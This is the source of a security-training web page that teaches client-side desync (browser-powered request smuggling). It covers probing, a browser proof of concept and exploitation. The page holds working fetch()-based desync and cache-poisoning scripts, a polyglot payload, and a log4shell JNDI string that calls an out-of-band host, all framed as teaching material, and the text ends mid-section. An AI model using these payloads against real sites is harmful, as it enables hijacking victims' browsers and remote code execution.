@extends('layouts.academy')

@section('title', 'Client-side desync attacks | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="45">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>HTTP request smuggling</h3>
        <ul>
            <li><a href="/web-security/request-smuggling#what-is-http-request-smuggling">What is HTTP request smuggling?</a></li>
            <li><a href="/web-security/request-smuggling#how-do-http-request-smuggling-vulnerabilities-arise">How vulnerabilities arise</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-1">
                <label for="sub-nav-id-1">
                    <a href="/web-security/request-smuggling#how-to-perform-an-http-request-smuggling-attack">Performing an attack</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/request-smuggling#cl-te-vulnerabilities">CL.TE vulnerabilities</a></li>
                    <li><a href="/web-security/request-smuggling#te-cl-vulnerabilities">TE.CL vulnerabilities</a></li>
                    <li><a href="/web-security/request-smuggling#te-te-behavior-obfuscating-the-te-header">TE.TE vulnerabilities</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/request-smuggling/finding">Identifying vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/request-smuggling/finding#finding-cl-te-vulnerabilities-using-timing-techniques">CL.TE vulnerabilities</a></li>
                    <li><a href="/web-security/request-smuggling/finding#finding-te-cl-vulnerabilities-using-timing-techniques">TE.CL vulnerabilities</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-3">
                <label for="sub-nav-id-3">
                    <a href="/web-security/request-smuggling/finding#confirming-http-request-smuggling-vulnerabilities-using-differential-responses">Confirming vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/request-smuggling/finding#finding-cl-te-vulnerabilities-using-timing-techniques">CL.TE vulnerabilities</a></li>
                    <li><a href="/web-security/request-smuggling/finding#finding-te-cl-vulnerabilities-using-timing-techniques">TE.CL vulnerabilities</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-4">
                <label for="sub-nav-id-4">
                    <a href="/web-security/request-smuggling/exploiting">Exploiting vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-bypass-front-end-security-controls">Bypassing front-end security controls</a></li>
                    <li><a href="/web-security/request-smuggling/exploiting#revealing-front-end-request-rewriting">Revealing front-end request rewriting</a></li>
                    <li><a href="/web-security/request-smuggling/exploiting#bypassing-client-authentication">Bypassing client authentication</a></li>
                    <li><a href="/web-security/request-smuggling/exploiting#capturing-other-users-requests">Capturing other users' requests</a></li>
                    <li><a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-exploit-reflected-xss">Exploiting reflected XSS</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-5">
                        <label for="sub-nav-id-5">
                            <a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect">Turning an on-site redirect into an open redirect</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/exploiting#turning-root-relative-redirects-into-open-redirects">Turning root-relative redirects into open redirects</a></li>
                        </ul>
                    </li>
                    <li><a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-perform-web-cache-poisoning">Web cache poisoning</a></li>
                    <li><a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-perform-web-cache-deception">Web cache deception</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-6">
                <label for="sub-nav-id-6">
                    <a href="/web-security/request-smuggling/advanced">Advanced request smuggling</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li>
                        <input type="checkbox" id="sub-nav-id-7">
                        <label for="sub-nav-id-7">
                            <a href="/web-security/request-smuggling/advanced#http-2-request-smuggling">HTTP/2 request smuggling</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/advanced#http-2-message-length">Message length</a></li>
                            <li><a href="/web-security/request-smuggling/advanced#http-2-downgrading">HTTP/2 downgrading</a></li>
                            <li><a href="/web-security/request-smuggling/advanced#h2-cl-vulnerabilities">H2.CL vulnerabilities</a></li>
                            <li><a href="/web-security/request-smuggling/advanced#h2-te-vulnerabilities">H2.TE vulnerabilities</a></li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-8">
                                <label for="sub-nav-id-8">
                                    <a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors">HTTP/2-exclusive vectors</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/request-smuggling/advanced#request-smuggling-via-crlf-injection">Request smuggling via CRLF injection</a></li>
                                    <li><a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#injecting-via-header-names">Injecting via header names</a></li>
                                    <li>
                                        <input type="checkbox" id="sub-nav-id-9">
                                        <label for="sub-nav-id-9">
                                            <a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#injecting-via-pseudo-headers">Injecting via pseudo-headers</a>
                                            <span class="icon-arrow-head-down"></span>
                                        </label>
                                        <ul>
                                            <li><a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#supplying-an-ambiguous-host">Supplying an ambiguous host</a></li>
                                            <li><a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#supplying-an-ambiguous-path">Supplying an ambiguous path</a></li>
                                            <li><a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#injecting-a-full-request-line">Injecting a full request line</a></li>
                                            <li><a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#injecting-a-url-prefix">Injecting a URL prefix</a></li>
                                            <li><a href="/web-security/request-smuggling/advanced/http2-exclusive-vectors#injecting-newlines-into-pseudo-headers">Injecting newlines</a></li>
                                        </ul>
                                    </li>
                                    <li><a href="/web-security/request-smuggling/advanced#hidden-http-2-support">Hidden HTTP/2 support</a></li>
                                </ul>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-10">
                        <label for="sub-nav-id-10">
                            <a href="/web-security/request-smuggling/advanced/response-queue-poisoning">Response queue poisoning</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/advanced/response-queue-poisoning#what-is-the-impact-of-response-queue-poisoning">Impact</a></li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-11">
                                <label for="sub-nav-id-11">
                                    <a href="/web-security/request-smuggling/advanced/response-queue-poisoning#how-to-construct-a-response-queue-poisoning-attack">Constructing an attack</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/request-smuggling/advanced/response-queue-poisoning#understanding-the-aftermath-of-request-smuggling">Understanding the aftermath of request smuggling</a></li>
                                    <li><a href="/web-security/request-smuggling/advanced/response-queue-poisoning#smuggling-a-complete-request">Smuggling a complete request</a></li>
                                    <li><a href="/web-security/request-smuggling/advanced/response-queue-poisoning#desynchronizing-the-response-queue">Desynchronizing the response queue</a></li>
                                    <li><a href="/web-security/request-smuggling/advanced/response-queue-poisoning#stealing-other-users-responses">Stealing other users' responses</a></li>
                                </ul>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-12">
                        <label for="sub-nav-id-12">
                            <a href="/web-security/request-smuggling/advanced#http-2-request-splitting">HTTP/2 request splitting</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/advanced#accounting-for-front-end-rewriting">Accounting for front-end rewriting</a></li>
                        </ul>
                    </li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-13">
                        <label for="sub-nav-id-13">
                            <a href="/web-security/request-smuggling/advanced/request-tunnelling">HTTP request tunnelling</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/advanced/request-tunnelling#request-tunnelling-with-http-2">HTTP/2 request tunnelling</a></li>
                            <li><a href="/web-security/request-smuggling/advanced/request-tunnelling#leaking-internal-headers-via-http-2-request-tunnelling">Leaking internal headers</a></li>
                            <li><a href="/web-security/request-smuggling/advanced/request-tunnelling#blind-request-tunnelling">Blind request tunnelling</a></li>
                            <li><a href="/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head">Non-blind request tunnelling using HEAD requests</a></li>
                            <li><a href="/web-security/request-smuggling/advanced/request-tunnelling#web-cache-poisoning-via-http-2-request-tunnelling">Web cache poisoning</a></li>
                        </ul>
                    </li>
                    <li><a href="/web-security/request-smuggling/advanced#0-cl-request-smuggling">0.CL request smuggling</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-14">
                <label for="sub-nav-id-14">
                    <a href="/web-security/request-smuggling/browser">Browser-powered request smuggling</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li>
                        <input type="checkbox" id="sub-nav-id-15">
                        <label for="sub-nav-id-15">
                            <a href="/web-security/request-smuggling/browser/cl-0">CL.0 request smuggling</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/browser/cl-0#testing-for-cl-0-vulnerabilities">Testing for CL.0 vulnerabilities</a></li>
                            <li><a href="/web-security/request-smuggling/browser/cl-0#eliciting-cl-0-behavior">Eliciting CL.0 behavior</a></li>
                            <li><a href="/web-security/request-smuggling/browser/cl-0#exploiting-cl-0-vulnerabilities">Exploiting CL.0 vulnerabilities</a></li>
                            <li><a href="/web-security/request-smuggling/browser/cl-0#h2-0-vulnerabilities">H2.0 vulnerabilities</a></li>
                        </ul>
                    </li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-16">
                        <label for="sub-nav-id-16">
                            <a href="/web-security/request-smuggling/browser/client-side-desync">Client-side desync attacks</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/request-smuggling/browser/client-side-desync#what-is-a-client-side-desync-attack">What is a client-side desync attack?</a></li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-17">
                                <label for="sub-nav-id-17">
                                    <a href="/web-security/request-smuggling/browser/client-side-desync#testing-for-client-side-desync-vulnerabilities">Testing for vulnerabilities</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/request-smuggling/browser/client-side-desync#probing-for-client-side-desync-vectors">Probing for client-side desync vectors</a></li>
                                    <li><a href="/web-security/request-smuggling/browser/client-side-desync#confirming-the-desync-vector-in-burp">Confirming the desync vector in Burp</a></li>
                                    <li><a href="/web-security/request-smuggling/browser/client-side-desync#building-a-proof-of-concept-in-a-browser">Building a proof of concept in a browser</a></li>
                                    <li><a href="/web-security/request-smuggling/browser/client-side-desync#handling-redirects">Handling redirects</a></li>
                                </ul>
                            </li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-18">
                                <label for="sub-nav-id-18">
                                    <a href="/web-security/request-smuggling/browser/client-side-desync#exploiting-client-side-desync-vulnerabilities">Exploiting vulnerabilities</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/request-smuggling/browser/client-side-desync#client-side-variations-of-classic-attacks">Client-side
                                        variations of classic attacks</a></li>
                                    <li>
                                        <input type="checkbox" id="sub-nav-id-19">
                                        <label for="sub-nav-id-19">
                                            <a href="/web-security/request-smuggling/browser/client-side-desync#client-side-cache-poisoning">Client-side cache poisoning</a>
                                            <span class="icon-arrow-head-down"></span>
                                        </label>
                                        <ul>
                                            <li><a href="/web-security/request-smuggling/browser/client-side-desync#poisoning-the-cache-with-a-redirect">With a redirect</a></li>
                                            <li><a href="/web-security/request-smuggling/browser/client-side-desync#triggering-the-resource-import">Triggering the resource import</a></li>
                                            <li><a href="/web-security/request-smuggling/browser/client-side-desync#delivering-a-payload">Delivering a payload</a></li>
                                        </ul>
                                    </li>
                                    <li><a href="/web-security/request-smuggling/browser/client-side-desync#pivoting-attacks-against-internal-infrastructure">Pivoting attacks against internal infrastructure</a></li>
                                </ul>
                            </li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-20">
                                <label for="sub-nav-id-20">
                                    <a href="/web-security/request-smuggling/browser/pause-based-desync">Pause-based desync attacks</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/request-smuggling/browser/pause-based-desync#server-side-pause-based-desync">Server side pause-based desync</a></li>
                                    <li><a href="/web-security/request-smuggling/browser/pause-based-desync#testing-for-pause-based-cl-0-vulnerabilities">Testing for pause-based CL.0 vulnerabilities</a></li>
                                    <li><a href="/web-security/request-smuggling/browser/pause-based-desync#client-side-pause-based-desync">Client-side pause-based desync</a></li>
                                </ul>
                            </li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li><a href="/web-security/request-smuggling#how-to-prevent-http-request-smuggling-vulnerabilities">Preventing vulnerabilities</a></li>
            <li><a href="/web-security/all-labs#http-request-smuggling">View all request smuggling labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/request-smuggling"><span itemprop="name">Request smuggling</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/request-smuggling/browser"><span itemprop="name">Browser-powered</span></a><meta itemprop="position" content="3" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/request-smuggling/browser/client-side-desync"><span itemprop="name">Client-side desync</span></a><meta itemprop="position" content="4" /></li></ul>    <div class="section theme-white">

        <h1 class="heading-2">Client-side desync attacks</h1><p>
            Classic desync or request smuggling attacks rely on intentionally malformed requests that ordinary browsers simply won't send. This limits these attacks to websites that use a front-end/back-end architecture. However, as we've learned from looking at <a href="/web-security/request-smuggling/browser/cl-0">CL.0 attacks</a>, it's possible to cause a desync using fully browser-compatible HTTP/1.1 requests. Not only does this open up new possibilities for server-side request smuggling, it enables a whole new class of threat - client-side desync attacks.
        </p><div class="highlightedarea">
            <h4>SecDevLab Research</h4>
            <p>
                The materials and labs in this section are based on <a href="https://portswigger.net/research/browser-powered-desync-attacks">Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling</a> by SecDevLab Research.
            </p>
        </div><h2 id="what-is-a-client-side-desync-attack">What is a client-side desync attack?</h2><p>
            A client-side desync (CSD) is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website. This can be contrasted with regular request smuggling attacks, which desynchronize the connection between a front-end and back-end server.
        </p><img alt="Client-side desync attack" src="/web-security/request-smuggling/images/client-side-desync.jpg"><p>
            Web servers can sometimes be encouraged to respond to <code>POST</code> requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, this results in a client-side desync vulnerability.
        </p><p>
            In high-level terms, a CSD attack involves the following stages:
        </p><ol>
            <li>
                <p>
                    The victim visits a web page on an arbitrary domain containing malicious JavaScript.
                </p>
            </li>
            <li>
                <p>
                    The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
                </p>
            </li>
            <li>
                <p>
                    The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
                </p>
            </li>
            <li>
                <p>
                    The JavaScript then triggers a follow-up request down the poisoned connection. This is appended to the malicious prefix, eliciting a harmful response from the server.
                </p>
            </li>
        </ol><p>
            As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable.
        </p><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                For these attacks to work, it's important to note that the target web server must not support HTTP/2. Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available.
            </p>
            <p>
                One exception to this rule is if you suspect that your intended victim will access the site via a forward proxy that only supports HTTP/1.1.
            </p>
        </div><h2 id="testing-for-client-side-desync-vulnerabilities">Testing for client-side desync vulnerabilities</h2><p>
            Due to the added complexity of relying on a browser to deliver your attack, it's important to be methodical when testing for client-side desync vulnerabilities. Although it may be tempting to jump ahead at times, we recommend the following workflow. This ensures that you confirm your assumptions about each element of the attack in stages.
        </p><ol>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#probing-for-client-side-desync-vectors">Probe for potential desync vectors in Burp.</a>
                </p>
            </li>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#confirming-the-desync-vector-in-burp">Confirm the desync vector in Burp.</a>
                </p>
            </li>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#building-a-proof-of-concept-in-a-browser">Build a proof of concept to replicate the behavior in a browser.</a>
                </p>
            </li>
            <li>
                <p>
                    Identify an exploitable gadget.
                </p>
            </li>
            <li>
                <p>
                    Construct a working <a href="/web-security/request-smuggling/browser/client-side-desync#exploiting-client-side-desync-vulnerabilities">exploit</a> in Burp.
                </p>
            </li>
            <li>
                <p>
                    Replicate the <a href="/web-security/request-smuggling/browser/client-side-desync#exploiting-client-side-desync-vulnerabilities">exploit</a> in your browser.
                </p>
            </li>
        </ol><p>
            Both Burp Scanner and the <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">HTTP Request Smuggler</a> extension can help you automate much of this process, but it's useful to know how to do this manually to cement your understanding of how it works.
        </p><h3 id="probing-for-client-side-desync-vectors">Probing for client-side desync vectors</h3><p>
            The first step in testing for client-side desync vulnerabilities is to identify or craft a request that causes the server to ignore the <code>Content-Length</code> header. The simplest way to probe for this behavior is by sending a request in which the specified <code>Content-Length</code> is longer than the actual body:
        </p><ul>
            <li>
                <p>
                    If the request just hangs or times out, this suggests that the server is waiting for the remaining bytes promised by the headers.
                </p>
            </li>
            <li>
                <p>
                    If you get an immediate response, you've potentially found a CSD vector. This warrants further investigation.
                </p>
            </li>
        </ul><p>
            As with <a href="/web-security/request-smuggling/browser/cl-0">CL.0 vulnerabilities</a>, we've found that the most likely candidates are endpoints that aren't expecting <code>POST</code> requests, such as static files or server-level redirects.
        </p><p>
            Alternatively, you may be able to elicit this behavior by triggering a server error. In this case, remember that you still need a request that a browser will send cross-domain. In practice, this means you can only tamper with the URL, body, plus a few odds and ends like the <code>Referer</code> header and latter part of the <code>Content-Type</code> header.
        </p><code class="code-scrollable">Referer: https://evil-user.net/?%00
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x</code><p>
            You may also be able to trigger server errors by attempting to navigate above the web root. Just remember that browsers normalize the path, so you'll need to URL encode the characters for your traversal sequence:
        </p><code class="code-scrollable">GET /%2e%2e%2f HTTP/1.1</code><h3 id="confirming-the-desync-vector-in-burp">Confirming the desync vector in Burp</h3><p>
            It's important to note that some secure servers respond without waiting for the body but still parse it correctly when it arrives. Other servers don't handle the <code>Content-Length</code> correctly but close the connection immediately after responding, making them unexploitable.
        </p><p>
            To filter these out, try sending two requests down the same connection to see if you can use the body of the first request to affect the response to the second one, just like you would when <a href="/web-security/request-smuggling/browser/cl-0#testing-for-cl-0-vulnerabilities">probing for CL.0 request smuggling</a>.
        </p><h3 id="building-a-proof-of-concept-in-a-browser">Building a proof of concept in a browser</h3><p>
            Once you've identified a suitable vector using Burp, it's important to confirm that you can replicate the desync in a browser.
        </p><div class="highlightedarea">
            <h4>Browser requirements</h4>
            <p>
                To reduce the chance of any interference and ensure that your test simulates an arbitrary victim's browser as closely as possible:
            </p>
            <ul>
                <li>
                    <p>
                        Use a browser that is <strong>not</strong> proxying traffic through Burp Suite - using any HTTP proxy can have a significant impact on the success of your attacks. We recommend Chrome as its developer tools provide some useful troubleshooting features.
                    </p>
                </li>
                <li>
                    <p>
                        Disable any browser extensions.
                    </p>
                </li>
            </ul>
        </div><ol>
            <li>
                <p>
                    Go to the site from which you plan to launch the attack on the victim. This must be on a different domain to the vulnerable site and be accessed over HTTPS. For the purpose of our labs, you can use the provided exploit server.
                </p>
            </li>
            <li>
                <p>
                    Open the browser's developer tools and go to the <strong>Network</strong> tab.
                </p>
            </li>
            <li>
                <p>
                    Make the following adjustments:
                </p>
                <ul>
                    <li>
                        <p>
                            Select the <strong>Preserve log</strong> option.
                        </p>
                    </li>
                    <li>
                        <p>
                            Right-click on the headers and enable the <strong>Connection ID</strong> column.
                        </p>
                    </li>
                </ul>
                <p>
                    This ensures that each request that the browser sends is logged on the <strong>Network</strong> tab, along with details of which connection it used. This can help with troubleshooting any issues later.
                </p>
            </li>
            <li>
                <p>
                    Switch to the <strong>Console</strong> tab and use <code>fetch()</code> to replicate the desync probe you tested in Burp. The code should look something like this:
                </p>
            </li>
        </ol><code class="code-scrollable">fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', <span class="orange">// malicious prefix</span>
    mode: 'no-cors', <span class="orange">// ensures the connection ID is visible on the Network tab</span>
    credentials: 'include' <span class="orange">// poisons the "with-cookies" connection pool</span>
}).then(() =&gt; {
    location = 'https://vulnerable-website.com/' <span class="orange">// uses the poisoned connection</span>
})</code><p>
            In addition to specifying the <code>POST</code> method and adding our malicious prefix to the body, notice that we've set the following options:
        </p><ul>
           <li>
               <p>
                   <code>mode: 'no-cors'</code> - This ensures that the connection ID of each request is visible on the <strong>Network</strong> tab, which can help with troubleshooting.
               </p>
           </li>
            <li>
                <p>
                    <code>credentials: 'include'</code> - Browsers generally use separate connection pools for requests with cookies and those without. This option ensures that you're poisoning the "with-cookies" pool, which you'll want for most exploits.
                </p>
            </li>
        </ul><p>
            When you run this command, you should see two requests on the <strong>Network</strong> tab. The first request should receive the usual response. If the second request receives the response to the malicious prefix (in this case, a 404), this confirms that you have successfully triggered a desync from your browser.
        </p><h3 id="handling-redirects">Handling redirects</h3><p>
            As we've mentioned already, requests to endpoints that trigger server-level redirects are a common vector for client-side desyncs. When building an exploit, this presents a minor obstacle because browsers will follow this redirect, breaking the attack sequence. Thankfully, there's an easy workaround.
        </p><p>
            By setting the <code>mode: 'cors'</code> option for the initial request, you can intentionally trigger a CORS error, which prevents the browser from following the redirect. You can then resume the attack sequence by invoking <code>catch()</code> instead of <code>then()</code>. For example:
        </p><code class="code-scrollable">fetch('https://vulnerable-website.com/redirect-me', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() =&gt; {
    location = 'https://vulnerable-website.com/'
})</code><p>
            The downside to this approach is that you won't be able to see the connection ID on the <strong>Network</strong> tab, which may make troubleshooting more difficult.
        </p><h2 id="exploiting-client-side-desync-vulnerabilities">Exploiting client-side desync vulnerabilities</h2><p>
            Once you've <a href="/web-security/request-smuggling/browser/client-side-desync#probing-for-client-side-desync-vectors">found a suitable vector</a> and <a href="/web-security/request-smuggling/browser/client-side-desync#building-a-proof-of-concept-in-a-browser">confirmed that you can successfully cause the desync in a browser</a>, you're ready to start looking for exploitable gadgets.
        </p><h3 id="client-side-variations-of-classic-attacks">Client-side variations of classic attacks</h3><p>
            You can use these techniques to perform many of the <a href="/web-security/request-smuggling/exploiting">same attacks</a> as you can with server-side request smuggling. All you need is for the victim to visit a malicious website that causes their browser to launch the attack.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => 'C7E1E3ECC45431F9694ADE69D2C269FDFEDCFF87AA2CB4525DD503090D7D467E'])@verbatim<h3 id="client-side-cache-poisoning">Client-side cache poisoning</h3><p>
            We previously covered how you can use a server-side desync to <a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect">turn an on-site redirect into an open redirect</a>, enabling you to hijack a JavaScript resource import. You can achieve the same effect just using a client-side desync, but it can be tricky to poison the right connection at the right time. It's much easier to use a desync to poison the browser's cache instead. This way, you don't need to worry about which connection it uses to load the resource.
        </p><p>
            In this section, we'll walk you through the process of constructing this attack. This involves the following high-level steps:
        </p><ol>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#testing-for-client-side-desync-vulnerabilities">Identify a suitable CSD vector</a> and desync the browser's connection.
                </p>
            </li>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#poisoning-the-cache-with-a-redirect">Use the desynced connection to poison the cache with a redirect.</a>
                </p>
            </li>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#triggering-the-resource-import">Trigger the resource import from the target domain.</a>
                </p>
            </li>
            <li>
                <p>
                    <a href="/web-security/request-smuggling/browser/client-side-desync#delivering-a-payload">Deliver a payload.</a>
                </p>
            </li>
        </ol><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                When testing this attack in a browser, make sure you clear your cache between each attempt (<strong>Settings &gt; Clear browsing data &gt; Cached images and files</strong>).
            </p>
        </div><h4 id="poisoning-the-cache-with-a-redirect">Poisoning the cache with a redirect</h4><p>
            Once you've <a href="/web-security/request-smuggling/browser/client-side-desync#probing-for-client-side-desync-vectors">found a CSD vector</a> and <a href="/web-security/request-smuggling/browser/client-side-desync#building-a-proof-of-concept-in-a-browser">confirmed that you can replicate it in a browser</a>, you need to identify a suitable <a href="/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect">redirect gadget</a>. After that, poisoning the cache is fairly straightforward.
        </p><p>
            First, tweak your proof of concept so that the smuggled prefix will trigger a redirect to the domain where you'll host your malicious payload. Next, change the follow-up request to a direct request for the target JavaScript file.
        </p><p>
            The resulting code should look something like this:
        </p><code class="code-scrollable">&lt;script&gt;
    fetch('https://vulnerable-website.com/desync-vector', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() =&gt; {
        location = 'https://vulnerable-website.com/resources/target.js'
    })
&lt;/script&gt;</code><p>
            This will poison the cache, albeit with an infinite redirect back to your script. You can confirm this by viewing the script in a browser and studying the <strong>Network</strong> tab in the developer tools.
        </p><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                You need to trigger the follow-up request via a top-level navigation to the target domain. Due to the way browsers partition their cache, issuing a cross-domain request using <code>fetch()</code> will poison the wrong cache.
            </p>
        </div><h4 id="triggering-the-resource-import">Triggering the resource import</h4><p>
            Sending your victim into an infinite loop may be mildly irritating, but it's not much of an exploit. You now need to further develop your script so that when the browser returns having already poisoned its cache, it is navigated to a page on the vulnerable site that will trigger the resource import. This is easily achieved using conditional statements to execute different code depending on whether the browser window has viewed your script already.
        </p><p>
            When the browser attempts to import the resource on the target site, it will use its poisoned cache entry and be redirected back to your malicious page for a third time.
        </p><h4 id="delivering-a-payload">Delivering a payload</h4><p>
            At this stage, you've laid the foundations for an attack, but the final challenge is working out how to deliver a potentially harmful payload.
        </p><p>
            Initially, the victim's browser loads your malicious page as HTML and executes the nested JavaScript in the context of your own domain. When it eventually attempts to import the JavaScript resource on the target domain and gets redirected to your malicious page, you'll notice that the script doesn't execute. This is because you're still serving HTML when the browser is expecting JavaScript.
        </p><p>
            For an actual exploit, you need a way to serve plain JavaScript from the same endpoint, while ensuring that this only executes at this final stage to avoid interfering with the setup requests.
        </p><p>
            One possible approach is to create a polyglot payload by wrapping the HTML in JavaScript comments:
        </p><code class="code-scrollable">alert(1);
/*
&lt;script&gt;
    fetch( ... )
&lt;/script&gt;
*/</code><p>
            When the browser loads the page as HTML, it will only execute the JavaScript in the <code>&lt;script&gt;</code> tags. When it eventually loads this in a JavaScript context, it will only execute the <code>alert()</code> payload, treating the rest of the content as arbitrary developer comments.
        </p><p>
            For more information about how we found this vulnerability in the wild, check out <a href="https://portswigger.net/research/browser-powered-desync-attacks#cisco">Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling</a> by SecDevLab Research.
        </p><h3 id="pivoting-attacks-against-internal-infrastructure">Pivoting attacks against internal infrastructure</h3><p>
            Most server-side desync attacks involve manipulating HTTP headers in a way that is only possible using tools like Burp Repeater. For example, it's not possible to make someone's browser send a request with a log4shell payload in the <code>User-Agent</code> header:
        </p><code class="code-scrollable">GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}</code><p>
            This means that these attacks are normally limited to websites that you can access directly. However, if the website is vulnerable to client-side desyncs, you may be able to achieve the desired effect by inducing a victim's browser to send the following request:
        </p><code class="code-scrollable">POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}</code><p>
